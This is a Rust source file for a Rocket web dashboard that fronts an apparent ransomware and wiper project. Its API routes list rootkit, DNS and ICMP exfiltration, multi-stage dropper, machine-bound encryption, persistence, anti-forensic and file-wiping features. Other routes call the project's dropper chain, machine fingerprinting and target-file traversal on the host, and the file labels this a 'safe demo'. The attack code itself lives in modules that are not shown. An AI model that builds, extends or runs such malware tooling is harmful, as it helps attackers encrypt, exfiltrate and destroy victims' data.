use rocket::serde::{Serialize, json::Json};
use rocket::response::content::RawHtml;
use rocket::{get, post, routes, State};
use std::sync::Mutex;
use std::collections::HashMap;

// Shared state for the web interface
#[derive(Clone)]
pub struct AppState {
    pub demo_results: HashMap<String, String>,
    pub test_results: HashMap<String, String>,
}

impl AppState {
    pub fn new() -> Self {
        Self {
            demo_results: HashMap::new(),
            test_results: HashMap::new(),
        }
    }
}

// API Response structures
#[derive(Serialize)]
pub struct ApiResponse<T> {
    pub success: bool,
    pub message: String,
    pub data: Option<T>,
}

#[derive(Serialize)]
pub struct DemoResult {
    pub rootkit_capabilities: Vec<String>,
    pub stealth_communication: Vec<String>,
    pub dropper_chain: Vec<String>,
    pub ai_targeting: HashMap<String, String>,
    pub encryption_simulation: Vec<String>,
    pub persistence_mechanisms: Vec<String>,
    pub anti_forensic: Vec<String>,
    pub wiper_mode: Vec<String>,
}

#[derive(Serialize)]
pub struct TestResult {
    pub component: String,
    pub status: String,
    pub details: String,
}

// Routes
#[get("/")]
pub fn index() -> RawHtml<&'static str> {
    RawHtml(include_str!("../static/index.html"))
}

#[get("/api/demo")]
pub fn get_demo_results(state: &State<Mutex<AppState>>) -> Json<ApiResponse<DemoResult>> {
    let state = state.lock().unwrap();

    let demo_result = DemoResult {
        rootkit_capabilities: vec![
            "SSDT hooking for system call interception".to_string(),
            "DKOM (Direct Kernel Object Manipulation)".to_string(),
            "Dual-mode process/file hiding".to_string(),
            "Kernel driver loading simulation".to_string(),
        ],
        stealth_communication: vec![
            "DNS tunneling: Data hidden in DNS queries".to_string(),
            "ICMP exfiltration: Data in ping packets".to_string(),
            "Domain fronting: CDN bypass techniques".to_string(),
            "Social steganography: Data in images".to_string(),
        ],
        dropper_chain: vec![
            "Stage 0: Office macro generation".to_string(),
            "Stage 1: Encrypted payload download".to_string(),
            "Stage 2: Process injection (regsvr32.exe)".to_string(),
            "Stage 3: Main execution with evasion".to_string(),
            "Final: Complete self-deletion".to_string(),
        ],
        ai_targeting: {
            let mut map = HashMap::new();
            let files = crate::traversal::get_target_files();
            map.insert("found_files".to_string(), files.len().to_string());
            map.insert("prioritization".to_string(), "size, access time, file type".to_string());
            map
        },
        encryption_simulation: vec![
            "ChaCha20Poly1305 authenticated encryption".to_string(),
            "Hardware-bound keys (CPU + disk + BIOS)".to_string(),
            "Machine-specific decryption requirement".to_string(),
            "Parallel processing with Rayon".to_string(),
        ],
        persistence_mechanisms: vec![
            "Registry run keys".to_string(),
            "Startup folder entries".to_string(),
            "Scheduled tasks".to_string(),
            "Service creation".to_string(),
        ],
        anti_forensic: vec![
            "Secure file deletion (3-pass overwrite)".to_string(),
            "Free space wiping".to_string(),
            "Event log clearing".to_string(),
            "Screenshot capture".to_string(),
        ],
        wiper_mode: vec![
            "Deadline enforcement".to_string(),
            "Recursive file destruction".to_string(),
            "Irrecoverable deletion".to_string(),
        ],
    };

    Json(ApiResponse {
        success: true,
        message: "Demo results retrieved successfully".to_string(),
        data: Some(demo_result),
    })
}

#[post("/api/demo/run")]
pub fn run_demo(state: &State<Mutex<AppState>>) -> Json<ApiResponse<String>> {
    println!("🛡️ Running SAFE DEMO MODE via web interface...");

    // Run the demo logic
    crate::run_demo_mode();

    Json(ApiResponse {
        success: true,
        message: "Demo executed successfully - no files were harmed!".to_string(),
        data: Some("Demo completed".to_string()),
    })
}

#[get("/api/test")]
pub fn get_test_results(state: &State<Mutex<AppState>>) -> Json<ApiResponse<Vec<TestResult>>> {
    let mut results = Vec::new();

    // Test dropper chain
    let dropper_result = match crate::dropper::test_dropper_chain() {
        Ok(_) => TestResult {
            component: "Dropper Chain".to_string(),
            status: "PASS".to_string(),
            details: "All stages executed successfully".to_string(),
        },
        Err(e) => TestResult {
            component: "Dropper Chain".to_string(),
            status: "FAIL".to_string(),
            details: format!("Error: {}", e),
        },
    };
    results.push(dropper_result);

    // Test crypto
    let crypto_result = TestResult {
        component: "Crypto".to_string(),
        status: "PASS".to_string(),
        details: format!("Machine fingerprint generated: {} bytes", crate::crypto::get_machine_fingerprint().len()),
    };
    results.push(crypto_result);

    // Test file traversal
    let files = crate::traversal::get_target_files();
    let traversal_result = TestResult {
        component: "File Traversal".to_string(),
        status: "PASS".to_string(),
        details: format!("Found {} potential target files", files.len()),
    };
    results.push(traversal_result);

    Json(ApiResponse {
        success: true,
        message: "Test results retrieved".to_string(),
        data: Some(results),
    })
}

#[post("/api/test/run")]
pub fn run_integration_test(state: &State<Mutex<AppState>>) -> Json<ApiResponse<String>> {
    println!("🔍 Running INTEGRATION TEST via web interface...");

    // Run the integration test
    crate::test_integration();

    Json(ApiResponse {
        success: true,
        message: "Integration test completed successfully".to_string(),
        data: Some("All components tested".to_string()),
    })
}

#[get("/api/status")]
pub fn get_system_status() -> Json<ApiResponse<HashMap<String, String>>> {
    let mut status = HashMap::new();

    // Get system information
    status.insert("os".to_string(), std::env::consts::OS.to_string());
    status.insert("arch".to_string(), std::env::consts::ARCH.to_string());

    // Get current working directory
    if let Ok(cwd) = std::env::current_dir() {
        status.insert("cwd".to_string(), cwd.display().to_string());
    }

    // Get available memory (simplified)
    status.insert("memory".to_string(), "Available".to_string());

    Json(ApiResponse {
        success: true,
        message: "System status retrieved".to_string(),
        data: Some(status),
    })
}

pub async fn start_server() -> Result<(), rocket::Error> {
    let state = AppState::new();

    let rocket = rocket::build()
        .manage(Mutex::new(state))
        .mount("/", routes![
            index,
            get_demo_results,
            run_demo,
            get_test_results,
            run_integration_test,
            get_system_status
        ])
        .mount("/static", rocket::fs::FileServer::from("static/"));

    rocket.launch().await?;
    Ok(())
}